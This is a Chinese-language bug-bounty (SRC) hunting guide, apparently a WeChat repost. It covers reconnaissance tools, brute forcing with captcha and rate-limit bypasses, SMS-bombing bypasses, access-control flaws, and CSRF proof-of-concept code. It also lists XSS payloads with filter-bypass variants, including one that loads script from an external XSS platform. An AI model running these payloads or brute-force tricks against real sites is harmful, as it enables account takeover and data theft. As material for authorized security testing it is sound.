#  [经验分享]-SRC漏洞挖掘之道   
点击关注👉  马哥网络安全   2024-02-25 18:00  
  
一个 SRC 混子挖 SRC 的半年经验分享~, 基本都是文字阐述，希望能给同样在挖洞的师傅们带来一点新收获。  
### 前期信息收集  
  
还是那句老话, 渗透测试的本质是信息收集，对于没有 0day 的弱鸡选手来说，挖 SRC 感觉更像是对企业的资产梳理，我们往往需要花很长的时间去做信息收集，收集与此公司相关的信息，包括**企业的分公司，全资子公司，网站域名、手机 app, 微信小程序，企业专利品牌信息，企业邮箱，电话**等等，对于很多万人挖的 src 来说，你收集到了别人没有收集过的资产，往往离挖到漏洞就不远了。  
#### 企业相关信息收集  
- 企查查 (https://www.qcc.com）  
  
- 天眼查 (https://www.tianyancha.com/)  
  
- 启信宝（https://www.qixin.com/)  
  
企查查、天眼查淘宝都有那种一天的会员。对于我们信息收集其实已经够用，个人更喜欢用企查查，因为它能一键导出域名，还可以直接查看企业关联的子公司，比较方便。  
  
**主要查询的信息:**  
1. 一般大的 src 都有许多子公司, 企查查可以在所属集团中查看该集团下子公司，并且可以导出。  
  
1. 查看同电话企业基本都是子公司。  
  
1. 查看股份穿透图，一般来说控股超过 50% 的子公司的漏洞 SRC 收录的可能性都比较大。  
  
1. 查看企业下的 app、小程序、还有品牌的资产，直接在搜索引擎里搜索品牌可能会有意想不到的收获。（找到一些平常收集不到的资产)  
  
PS: 一般来说 100% 的全资子公司 src 漏洞是一定会收的，其他子公司资产可能需要与 src 审核沟通（扯皮)。  
- 站长之家:http://whois.chinaz.com/  
  
- 邮箱反查、注册人反查、电话反查。  
  
- 推荐个项目:https://github.com/code-scan/BroDomain 兄弟域名查询。  
  
- https://www.qimai.cn/  
  
- 七麦数据，可以查到企业下一些比较冷门的 app。  
  
**信息整理**  
  
当我们通过各种手段对挖掘的企业进行信息收集后，我们大致能得到以下有用的信息  
- 主公司及分公司、子公司下所有归属的网站域名信息；  
  
- 主公司及分公司、子公司下所有的专利品牌和开发的一些独立系统。  
  
- 主公司及分公司、子公司下所有的 app 资产和微信小程序。  
  
之后我们需要对这些信息进行归纳和整理, 比如哪些是该公司的主资产，哪些是边缘资产，哪些资产看上去比较冷门，我们是可以重点关注和进行深入挖掘的。  
#### 子域名收集和网站信息收集  
  
子域名的话，对于我来说 oneforall 和 xray 的功能已经足够强大了，对于一些主域名来说，如果想要充分的收集子域名，最好用特大号字典进行最少三层的子域名爆破。这块还是 layer 子域名挖掘机不错。  
##### 通过 github 收集子域名  
  
先分享一个姿势，很多时候 github 上已经有热心的师傅分享了自己跑出的子域名，所以可以先到 github 找一找有没有现成的可以白嫖，没啥好语法，纯靠大海捞针。。  
##### oneforAll  
  
https://github.com/shmilylty/OneForAll  
- 需要到配置文件里填写 api 接口信息，  
  
- 根据需求修改其他的配置，比如可以配置一些常见的端口，当做简单的端口扫描工具用。  
  
命令  
```
python oneforall.py --targets ./domain.txt run
python oneforall.py --targets ./domain.txt  --brute true run

```  
  
我实际操作发现在挂了外网代理和没挂代理时跑出来的子域有时候差的有点大，想收集的全一点的师傅可以不挂代理和挂代理都跑一遍。然后去重一下。  
##### xray  
  
子域名探测需要高级版，可以自己写个十几行的代码进行批量探测，也可以直接用这个项目里的代码，  
  
https://github.com/timwhitez/rad-xray 命令改一下能批量探测子域名，一般 5 到 10 分钟一个子域。  
##### Goby  
  
官网:https://gobies.org/  
  
因为之前一直在用 masscan+nmap 的方式进行端口扫描，用这个项目:https://github.com/hellogoldsnakeman/masnmapscan-V1.0  
```
前一段时间接触到goby，感觉可视化的工具用起来还是舒服，可以短时间对一些常见端口进行扫描，还能对网站进行指纹识别，报告看起来挺舒服的。

```  
  
因为在实际的端口扫描过程，由于 cdn 或者防火墙的原因，所以没必要一上来就全端口扫描，听一位师傅分享的经验，比如当扫描到 22 端口开放时，说明这个 ip 没有 cdn 保护，对于这种 ip 我们可以提取出来，然后重点进行全端口扫描，有收获的可能性会比较大。  
##### BBScan  
  
猪猪侠师傅写的工具，速度很快，简单的目录扫描，主要是可以探测 C 段下面的很多资产，扩充攻击面。  
  
项目地址:  
  
https://github.com/lijiejie/BBScan  
  
https://github.com/yhy0/BBScan （添加了 springboot 的泄露探测）  
- 可以对域名、ip、C 段进行探测  
  
- 快速探测管理后台  
  
- 进行端口探测  
  
- 探测敏感信息泄露  
  
- 可以自定义扫描规则  
  
report 下看报告, 误报肯定会很多，但 C 段下很可能会有意想不到的资产。  
##### js 信息收集  
  
主要是爬取网站的敏感 js 文件，js 中能收集到的信息:  
- 增加攻击面 (url、域名)  
  
- 敏感信息 (密码、API 密钥、加密方式)  
  
- 代码中的潜在危险函数操作  
  
- 具有已知漏洞的框架  
  
常用的工具  
  
速度很快的 jsfinder https://github.com/Threezh1/JSFinder  
  
xray 的 rad 爬虫 https://github.com/chaitin/rad  
  
能够匹配敏感信息的 JSINFO-SCAN：https://github.com/p1g3/JSINFO-SCAN  
### 捡中低危漏洞的一些技巧  
  
刚开始挖 src 往往不知道从哪下手，首先我们其实可以从各个 src 平台提交漏洞下拉框里看一看收取的漏洞类型。然后针对性的去学习如何挖掘，比如某 src 收取的漏洞类型, 我们就可以针对性的学习对应的挖掘技巧。  
```
框架注入
 明文密码传输
 表单破解漏洞
 IIS短文件名泄露
 老旧过期的HTTPS服务
 跨目录下载漏洞
 目录可浏览漏洞
 LFI本地文件包含漏洞
 RFI远程文件包含漏洞
 HTTP拒绝服务攻击
 弱口令登录
 CSRF跨站点请求伪造
 Flash点击劫持
 SQL注入漏洞
 XSS跨站脚本漏洞
 文件上传漏洞
 解析漏洞:IIS解析漏洞
 解析漏洞:Apache解析漏洞
 Cookies注入漏洞
 越权访问漏洞
 命令执行漏洞
 Struts2远程代码执行漏洞
 业务逻辑漏洞
 用户隐私泄露
 敏感信息泄漏(运维)
 敏感信息泄漏(研发)
 敏感文件泄漏(运维)(配置)
 敏感文件泄漏(运维)(权限)
 未验证的重定向和传递
 Flash跨域访问资源
 测试文件泄漏
 开启危险的HTTP方法
 HTTP参数污染
 Unicode编码绕过
 源码泄漏
 后台目录泄漏
 链接注入漏洞
 SSRF服务器请求伪造
 jsonp劫持

```  
  
学习完基础的漏洞类型后，我们可以多看一些实战的漏洞报告。比如 wooyun 漏洞库和 hackone 上的报告。  
- 乌云漏洞库:https://wooyun.x10sec.org/  
  
- hackone 报告：https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA 提取码: 2klt  
  
这里列举一些我经常挖到的垃圾洞，生而为人，挖不到大洞，我很抱歉┭┮﹏┭┮。  
#### 登录框处常见的一些漏洞  
  
在我们通过对目标的前期信息收集之后，首当其冲的往往就是各种奇奇怪怪的登录框，一般来说，大型的企业为了减少安全问题，一般都是用统一的登录接口登录不同的旗下网站，但是一些后台系统，运维系统，或者一些边缘业务使用了独立的注册、登录体系，这个时候往往就会存在安全问题。  
  
**现在还能用的接码平台:**  
- http://www.114sim.com/  
  
- https://yunduanxin.net/China-Phone-Number/  
  
- https://www.materialtools.com/  
  
##### 绕过限制导致的爆破、撞库、用户遍历漏洞  
  
最常见的一种漏洞，尤其是一些老旧的后台系统，可能验证码抓个包就绕过去了。下面是一些常见的绕过姿势:  
- 验证码不刷新  
  
- 验证码抓包绕过  
  
- 验证码删除绕过  
  
- 验证码置空绕过  
  
- 修改 xff 头绕过: 推荐个 burp 插件,https://github.com/TheKingOfDuck/burpFakeIP  
  
- 账号后加空格绕过账号错误次数限制。  
  
一般来说如果只是简单的验证码绕过，一般都是低危，所以一般能够绕过验证码的情况，都要尝试爆破一波账号密码。  
##### 弱口令漏洞  
  
**没有验证码或者验证码可以绕过的情况**  
  
直接上一手字典爆破，当然还是有一些小技巧:  
- 比如可以设置固定的弱密码，比如 123456，然后爆破账号。  
  
- 比如可以首先收集一些网站的信息针对性的制作字典，比如域名，员工邮箱，企业名称等等, 推荐工具: 白鹿社工字典生成:https://github.com/HongLuDianXue/BaiLu-SED-Tool  
  
爆破的关键在于字典，常见的字典 github 上都有, 但是普通的弱口令现在确实不太好用了，要想提高成功的机率，还是需要碰一碰强密码，分享先知的文章:  
- https://xz.aliyun.com/t/7823  
  
- https://github.com/huyuanzhi2/password_brute_dictionary  
  
**有验证码且无法绕过的情况**  
- github 直接找员工账号邮箱，密码。  
  
- 源码或者 js 文件查找线索，邮箱，或者加密的账号密码。  
  
- 特定系统或者 cms，搜索引擎搜索默认管理员或者测试密码。  
  
- 手动尝试常见弱口令。  
  
##### 注册、登录、找回密码处的短信 \ 邮箱轰炸漏洞  
  
这个也挺常见的，一般可以对特定用户进行轰炸的是一定会收的，横向轰炸能够消耗资源的随缘收。常见的绕过姿势:  
- 加空格绕过  
  
- 加任意字母绕过  
  
- 前面加 86 绕过  
  
- xff 头伪造 ip 绕过  
  
##### 逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞  
  
因为这方面漏洞一旦出现基本都是高危，所以挖掘的时候  
  
类似的思路我就不细说了, freebuf 上有任意用户密码重置的系列文章, 类似漏洞思路其实相差不大:  
  
https://www.freebuf.com/author/yangyangwithgnu  
#### 常见的信息泄露漏洞  
  
敏感信息泄露的范围很广，我认为一般就是两大类，  
- 因为配置错误或者管理不当导致的企业内部信息泄露。  
  
- 因为逻辑缺陷导致的用户资料泄露 (遍历)。  
  
##### github 导致的信息泄露  
- P 牛知识星球里分享的 github 搜索关键词:https://twitter.com/obheda12/status/1316513838716551169  
  
- github 子域名监控项目:https://github.com/FeeiCN/GSIL  
  
- 常见的泄露内容:  
  
乌云上有一些案例，可以看一看。  
  
- 员工内部邮箱、登录账号、密码。  
  
- 企业的一些内部系统域名、ip 泄露。  
  
- 企业网站的工程代码、网站源码泄露，可以通过员工邮箱关键词查找，要注意日期，好几年的大概率不收了。  
  
##### 配置错误导致的信息泄露  
  
包含的类型很多，最重要的是有一份足够强大的字典和一个好用的扫描器。  
  
我在实际进行探测的时候，对于大批量的域名来说，更喜欢先用一份精简的小字典先进行快速扫描  
  
比如:  
- 备份文件的小字典  
  
- springboot 泄露的小字典  
  
- 网站后台的小字典  
  
比较出名的扫描器我们常见的 dirsearch、dirmap，dirbuster 等等。  
  
可视化的比如 TEST404 系列、御剑扫描器使用体验也不错。  
  
注: 信息泄露中比较常见的 swagger-ui 服务泄露，可能直接提交会忽略或者低危，别忘了进一步测试泄露的接口功能。  
##### 越权导致的信息泄露  
  
很多时候越权来来去去都是更改一个参数的问题, 更多的时候还是要细心的一个一个测业务功能，注意观察和测试操作参数和对象参数，操作参数一般是增删改查对应特定业务的敏感操作、对象参数一般是用户或者物品等。  
  
推荐几个 burp 插件:  
- 未授权检测：https://github.com/theLSA/burp-unauth-checker  
  
- 敏感参数提取：https://github.com/theLSA/burp-sensitive-param-extractor  
  
- 信息提取：https://github.com/theLSA/burp-info-extractor  
  
插件的作用基本还是帮助我们快速定位敏感参数，实际测试还是需要我们一个包一个包仔细的分析程序逻辑。  
  
**常见的一些越权情况:**  
- 基于用户 ID 的越权  
  
- 基于功能对象 ID 的越权  
  
- 基于上传对象 ID 的越权  
  
- 基于未授权访问的越权  
  
- 基于功能地址的越权  
  
- 基于接口身份的越权  
  
### 其他的 OWASPTop10 漏洞  
#### CSRF 漏洞  
  
CSRF 漏洞在挖掘中最重要的是说明危害，比较容易扯皮，一般来说涉及用户资料、财产、权限的 CSRF 漏洞大概率会收，一般来说最高就是中危。捡捡垃圾洞还是可以的。  
  
**常见的漏洞点**  
  
1、修改个人资料、邮箱、密码、头像  
  
2、发表文章  
  
3、添加、删除评论  
  
4、添加、修改、删除收货地址  
  
5、添加管理员  
  
**(1) GET 型**  
  
GET 类型的 CSRF 利用非常简单，只需要一个 HTTP 请求，所以，一般会这样利用：  
- ```
<img src=xxx/csrf?xx=11 />

```  
  
  
-   
-   
(**2) POST 型**  
  
POST 请求中没有 token 参数，然后请求也没有验证 referer 信息。这种是存在 CSRF 情况最多的一种。这种漏洞的检测方法也很简单，网页操作某功能，抓包后，如果发现没有 token 等参数，然后就将 referer 信息设置为空，再次发包请求，如果请求成功了，就说明这里有 CSRF 漏洞。  
  
poc(可以用 burp 自己生成的）:  
```
<html>    
<body>         
<form >            
<input type="text" >        
</form>       
<script>document.px.submit(); </script>     
</body> 
</html>

```  
  
POST 请求数据为 json，当服务器没有严格校验 content-type 类型时，POC 为：  
```
<script>  
var xhr = new XMLHttpRequest();  
xhr.open("POST", "http://www.xxxx.com/api/setrole");  
xhr.withCredentials = true;  
xhr.setRequestHeader("Content-Type", "text/plain;charset=UTF-8");  xhr.send('{"role":admin}');
</script>

```  
##### 3. Flash 型  
  
Flash CSRF 通常是由于 Crossdomain.xml 文件配置不当造成的，利用方法是使用 swf 来发起跨站请求伪造。  
  
利用条件：  
  
1、目标站点下必须存在 crossdomain.xml 文件。  
  
2、crossdomain.xml 中的配置允许其他域进行跨域请求。  
```
<?xml version="1.0"?><cross-domain-policy>  <allow-access-from domain="*" /></cross-domain-policy>

```  
  
**bypass 小技巧**  
- 删除 csrf token  
  
- 置空 csrf token  
  
- 修改请求方法，如 POST 方法变 GET 请求  
  
- 使用与 token 相同长度的任意字符串替换 token，例如尝试更改一个字符，看看或发生什么  
  
- 使用固定 token  
  
- token 字段改成 token[]=  
  
#### 任意文件上传漏洞  
  
这个洞遇到的也比较多，一般来说是后端没有限制上传文件的类型。但是上传的脚本文件也不会解析。也就没有办法 getshell。(很多 SRC 对于上传到 cdn 云服务器的任意文件上传是忽略的)。  
- 上传含有 xss 代码的 html 文件，造成存储型 xss(如果上传到了 cdn 服务器之类的大概率忽略)。  
  
- 上传恶意文件进行钓鱼  
  
- 尝试在上传的文件名前加../ 进行目录穿越。  
  
- 可以结合其他漏洞比如 CORS 漏洞扩大危害。  
  
文件上传的常见的绕过姿势应该也挺熟悉的了。。，实际测试的时候发现在进行申请企业、个人认证的时候，上传文件处常常有这个问题。  
#### XSS 漏洞  
  
老熟人了，不多说了，常见的姿势大家应该都知道。分享一个我学 XSS 的文章:https://wizardforcel.gitbooks.io/xss-naxienian/content/index.html  
  
Broken5 师傅的 xsspayload:  
```
<script>alert(1)</script>
<script src=https://xsspt.com/VBAhTu></script>
<a href=javascript:alert(1)>xss</a>
<svg onload=alert(1)>
<img src=1 onerror=alert(1)>
<img src=https://www.baidu.com/img/bd_logo1.png onload=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
<M onmouseover=alert(1)>M
<iframe src=javascript:alert(1)></iframe>
<iframe onload=alert(1)>
<input type="submit" onfocus=alert(1)>
<input type="submit" onclick=alert(1)>
<form><input type="submit" formaction=javascript:alert(1)>

```  
##### bypass 姿势  
```
<!-- 空格被过滤 -->
<img/src="1"/onerror=alert(1)>

<!-- 双写绕过 -->
<iimgmg src=1 oonerrornerror=aimglert(1)>

<!-- 大小写绕过  -->
<iMg src=1 oNerRor=alert(1)>

<!-- 利用eval() -->
<img src=1 onerror="a=`aler`;b=`t(1)`;eval(a+b);">
<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>

<!-- 利用location -->
<img src=1 onerror=location='javascript:%61%6C%65%72%74%28%31%29'>
<img src=1 onerror=location='javascript:\x61\x6C\x65\x72\x74\x28\x31\x29'>
<img src=1 onerror=location="javascr"+"ipt:"+"%61%6C%65%72%74%28%31%29">

<!-- 括号被过滤 -->
<img src=1 onerror="window.onerror=eval;throw'=alert\x281\x29';">

<!-- onerror=被过滤 -->
<img src=1 onerror     =alert(1)>
<img src=1 onerror
=alert(1)>

<!-- 属性被转换为大写 -->
<img src=1 onerror=alert(1)>

<!-- 编码后被检测 -->
<img src=1 onerror=alert(1)>

```  
#### 威胁情报的提交  
  
这块我也没有经验，给大家分享两篇文章吧。。。信息收集到了还是可以试试提交的  
  
https://mp.weixin.qq.com/s/v2MRx7qs70lpnW9n-mJ7_Q  
  
https://bbs.ichunqiu.com/article-921-1.html  
  
可以试一试加一加各种羊毛群，反手撸一手羊毛群的羊毛。  
### 对于挖掘高危、严重级别漏洞的一些思考  
  
因为一直以来挖到高危、严重的数量寥寥无几，基本上就是一直在捡一些中低危漏洞，这段时间也看了很多牛叉的漏洞报告，想聊一聊我的思考。  
##### 1. 自动化信息收集的能力  
  
这里说的信息收集更多的是如何利用已有的工具进行快速自动化的收集和整理，既要做到速度快，还要做到全面收集不遗漏信息，很多时候这个过程本身就是在发现漏洞。  
  
这些工作应该在我们前期信息收集的阶段就应该全面的完成，所以如何快速化的进行全面的信息收集是我们需要思考和不断实践的。  
##### 2. 打漏洞组合拳的能力  
  
SRC 对于漏洞评级主要是看你漏洞可以造成的危害，所以当挖到一些低危漏洞时，可以先不急着提交，找一找有没有其他可以利用的点打漏洞组合拳。  
##### 3. 绕 waf 的能力  
  
这个能力挺欠缺的。挖洞的过程基本遇到 waf 就溜了，尤其是一些大厂的 waf，绕其他 waf 就是直接嫖一些其他的师傅的思路。  
##### 4. 细心和耐心和一些运气  
  
心细挖天下，再加上一些运气，可能高危严重就到手了。  
#### 总结  
  
挖 SRC 需要有一个好心态，国内 SRC 生态并不是很好，SRC 感觉更多的提供了一个相对安全的测试保障，所以更需要抱着一种学习的心态去挖，将我们学习的到的知识灵活运用，发现新的问题。不要想我今晚一定要挖到多少漏洞，要拿到多少奖金，不然可能会被忽略三连打崩心态。  
  
作者: 刚刚入门的小白（侵删）  
  
转自: https://xz.aliyun.com/t/8501  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/INa3lxHH4I2aV3zCmfiaj4cXeQ2HQd6s53wJS36HYI65ib48fujDK8najfWiahicsljzsdT3dfVS8HHyxaviaSd8g2g/640?wxfrom=5&wx_lazy=1&wx_fmt=png&wx_co=1 "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaZVWLqKWYqToBBoLTeNc2Nmly4DBgnj2omUrnWukGfmCCQtViaLiajKHp4cCUM9FWg8s14UORhccUBg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
  
[● 渗透测试以及checklist模板](http://mp.weixin.qq.com/s?__biz=MzkxMzMyNzMyMA==&mid=2247552272&idx=2&sn=b592f9488eb751ea5b076a42dead9c2d&chksm=c17d18a7f60a91b126093c874b8261150fef080815aabef595a318b3c28c82ff3ce700e5b8eb&scene=21#wechat_redirect)  
  
  
  
[● 学MSF看这一篇就够了](http://mp.weixin.qq.com/s?__biz=MzkxMzMyNzMyMA==&mid=2247525937&idx=1&sn=6d489411033ff5b11e4c0a7724d8e882&chksm=c17d7386f60afa906b882fceda3a7bab684e25b8e9d1f1dc28d4a176cf4534811171a206780d&scene=21#wechat_redirect)  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/UkV8WB2qYAkZUWAdRpPOBGYEK7UyRbNsayG2YZrib6HdH9e1tUzvFsbI8vDTmcAcFJicDibol6p94E3PH6qpmM4GQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
